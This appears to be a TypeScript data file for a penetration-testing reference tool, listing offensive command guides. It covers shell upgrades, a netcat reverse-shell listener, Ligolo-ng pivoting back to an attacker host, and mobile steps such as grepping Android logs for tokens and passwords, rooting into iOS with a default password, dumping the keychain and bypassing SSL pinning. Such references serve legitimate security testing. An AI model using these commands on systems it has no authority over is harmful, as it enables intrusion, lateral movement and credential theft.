import { BookOpen } from 'lucide-react';

export interface GuideItem {
    id: string;
    name: string;
    category: string;
    subcategory: string;
    desc: string;
    content: string;
}

export const GUIDES: GuideItem[] = [
    // --- SHELLS ---
    {
        id: 'python_interactive_shell',
        name: 'Python TTY',
        category: 'GUIDE',
        subcategory: 'Interactive Shell',
        desc: 'Basic usage of the Python interactive shell.',
        content: `# Launch Python Interactive Shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# CTRL+Z to background the shell and return to your terminal 
stty raw -echo;fg 

# Set terminal type
export TERM=xterm

# or Try to listen with rlwrap
rlwrap nc -lnvp 1234
`
    },
    {
        id: 'script_utility_interactive_shell',
        name: 'Script Utility',
        category: 'GUIDE',
        subcategory: 'Interactive Shell',
        desc: 'Using Script Utility to create interactive shells.',
        content: `# Launch Interactive Shell with Script Utility
script /dev/null -c /bin/bash

# CTRL+Z to background the shell and return to your terminal 
stty raw -echo;fg 
`
    },
    {
        id: 'public_rev_shell',
        name: 'Public Rev Shell',
        category: 'GUIDE',
        subcategory: 'Shells',
        desc: 'Method to get reverse shell from public network (Piggy, Ngrok).',
        content: `# 1. Piggy 
# Free both TCP and HTTP

# 2. Ngrok 
# Free for HTTP, but TCP requires credit card
`
    },

    // --- PIVOTING ---
    {
        id: 'ligolo',
        name: 'Ligolo',
        category: 'GUIDE',
        subcategory: 'Pivoting',
        desc: 'Using Ligolo for network pivoting.',
        content: `# Start Ligolo-ng Proxy on Attack Host
sudo ./proxy -selfcert -laddr 0.0.0.0:443
ligolo-ng>> interface_create --name "ligolo"

# Connect Ligolo-ng Agent to Attacker Host
./agent -connect <PROXY_IP>:443 -ignore-cert 

# Attack Operations: Route, Port Forward, and Start Tunnel
ligolo-ng>> session
ligolo-ng>> tunnel_start --tun ligolo
ligolo-ng>> interface_add_route --name ligolo --route <TARGET_SUBNET>
ligolo-ng>> listener_add --addr 0.0.0.0:1234 --to 10.10.14.12:4321 --tcp     

# 240.0.0.1/32    when need to use pivot machine localhost use this address             
# note: start the tunnel before adding route to avoid error 
`
    },

    // --- MOBILE ---
    {
        id: 'android_basic',
        name: 'Android',
        category: 'GUIDE',
        subcategory: 'Mobile',
        desc: 'Basic setup and common commands for Android application penetration testing.',
        content: `# Step 1: Connect Device & Verify
adb devices

# Step 2: Access Shell
adb shell

# Step 3: List Packages (Third Party)
pm list packages -3

# Step 4: Pull APK for analysis
adb pull /data/app/com.example.app/base.apk ./target_app.apk

# Step 5: Logcat for sensitive info
# Grep for specific keywords
adb logcat | grep -i "token"
adb logcat | grep -i "password"`
    },
    {
        id: 'ios_basic',
        name: 'iOS',
        category: 'GUIDE',
        subcategory: 'Mobile',
        desc: 'Essential commands for iOS pentesting via SSH/Objection.',
        content: `# Step 1: SSH into Jailbroken Device
# Default pass: alpine
ssh root@$TARGET

# Step 2: List running processes
ps aux

# Step 3: Dump Keychain (requires tools)
# Using objection
objection --gadget "com.example.app" explore
ios keychain dump

# Step 4: Bypass SSL Pinning
ios sslpinning disable`
    }
];
